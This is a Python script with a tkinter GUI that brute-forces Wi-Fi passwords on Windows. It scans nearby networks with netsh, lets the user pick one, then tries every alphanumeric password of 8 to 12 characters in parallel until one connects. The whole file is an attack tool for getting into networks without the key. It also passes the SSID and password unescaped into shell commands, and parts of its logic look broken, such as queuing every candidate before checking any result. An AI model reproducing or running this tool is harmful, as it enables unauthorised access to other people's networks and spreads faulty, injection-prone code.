import os
import time
import itertools
import string
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import messagebox, simpledialog

def scan_wifi_networks():
    command = 'netsh wlan show networks'
    result = os.popen(command).read()
    networks = []
    for line in result.split('\n'):
        if "SSID" in line:
            ssid = line.split(":")[1].strip()
            if ssid:
                networks.append(ssid)
    return networks

def connect_to_wifi(ssid, password):
    command = f'netsh wlan connect name="{ssid}" ssid="{ssid}" key="{password}"'
    result = os.system(command)
    return result == 0

def disconnect_from_wifi():
    os.system('netsh wlan disconnect')

def generate_passwords(charset, min_length, max_length):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(charset, repeat=length):
            yield ''.join(password)

def test_password(ssid, password):
    print(f"Пробуем пароль: {password}")
    if connect_to_wifi(ssid, password):
        print(f"Успешно подключились с паролем: {password}")
        return password
    else:
        print(f"Не удалось подключиться с паролем: {password}")
    disconnect_from_wifi()
    time.sleep(1)  # Подождите немного перед следующей попыткой
    return None

def test_passwords_parallel(ssid, charset, min_length, max_length):
    with ThreadPoolExecutor(max_workers=4) as executor:  # Вы можете изменить количество потоков
        futures = []
        for password in generate_passwords(charset, min_length, max_length):
            futures.append(executor.submit(test_password, ssid, password))
        
        for future in futures:
            result = future.result()
            if result:
                return result
    return None

def start_bruteforce(ssid, charset, min_length, max_length):
    successful_password = test_passwords_parallel(ssid, charset, min_length, max_length)
    if successful_password:
        messagebox.showinfo("Успех", f"Успешно подключились к Wi-Fi с паролем: {successful_password}")
    else:
        messagebox.showerror("Ошибка", "Не удалось подключиться к Wi-Fi с любым из сгенерированных паролей.")

def on_start():
    networks = scan_wifi_networks()
    if not networks:
        messagebox.showerror("Ошибка", "Wi-Fi сети не найдены.")
        return

    network_choice = simpledialog.askstring("Выбор сети", "Введите номер Wi-Fi сети:\n" + "\n".join([f"{i + 1}. {network}" for i, network in enumerate(networks)]))
    if not network_choice or not network_choice.isdigit() or int(network_choice) < 1 or int(network_choice) > len(networks):
        messagebox.showerror("Ошибка", "Неверный выбор.")
        return

    ssid = networks[int(network_choice) - 1]
    charset = string.ascii_letters + string.digits  # Вы можете добавить больше символов при необходимости
    min_length = 8  # Минимальная длина пароля
    max_length = 12  # Максимальная длина пароля

    start_bruteforce(ssid, charset, min_length, max_length)

if __name__ == "__main__":
    root = tk.Tk()
    root.title("Wi-Fi Brute Force")
    root.geometry("300x200")

    start_button = tk.Button(root, text="Начать", command=on_start)
    start_button.pack(pady=20)

    root.mainloop()
